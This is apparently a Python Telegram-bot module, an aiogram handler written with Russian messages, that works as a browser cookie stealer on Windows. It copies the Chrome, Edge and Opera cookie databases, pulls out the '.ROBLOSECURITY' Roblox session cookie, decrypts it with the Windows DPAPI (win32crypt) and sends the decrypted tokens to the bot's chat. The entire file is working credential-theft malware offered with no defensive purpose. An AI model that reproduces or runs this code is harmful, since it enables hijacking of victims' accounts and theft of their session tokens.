from aiogram import types
import os
import sqlite3
import shutil
import win32crypt

BROWSER_PATHS = {
    "Chrome": r"~\AppData\Local\Google\Chrome\User Data\Default\Cookies",
    "Edge": r"~\AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
    "Opera": r"~\AppData\Roaming\Opera Software\Opera Stable\Cookies"
}


async def send_browser_cookies(message: types.Message):
    all_cookies = ""

    for browser, path in BROWSER_PATHS.items():
        cookie_path = os.path.expanduser(path)
        if not os.path.exists(cookie_path):
            continue  # если браузера нет, пропускаем

        temp_path = os.path.join(os.environ["TEMP"], f"{browser}_cookies.db")
        try:
            shutil.copy2(cookie_path, temp_path)
        except Exception as e:
            all_cookies += f"Ошибка копирования {browser}: {e}\n"
            continue

        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")

            browser_cookies = ""
            for host, name, encrypted_value in cursor.fetchall():
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                    browser_cookies += f"[{host}] {name} = {decrypted.decode('utf-8')}\n"
                except Exception as e:
                    browser_cookies += f"Ошибка расшифровки: {e}\n"

            conn.close()
        except Exception as e:
            all_cookies += f"Ошибка работы с базой {browser}: {e}\n"
            continue
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)

        if browser_cookies:
            all_cookies += f"=== {browser} ===\n{browser_cookies}\n"

    if not all_cookies:
        all_cookies = "Куки .ROBLOSECURITY не найдены ни в одном браузере."

    await message.answer(f"Собранные куки:\n{all_cookies}")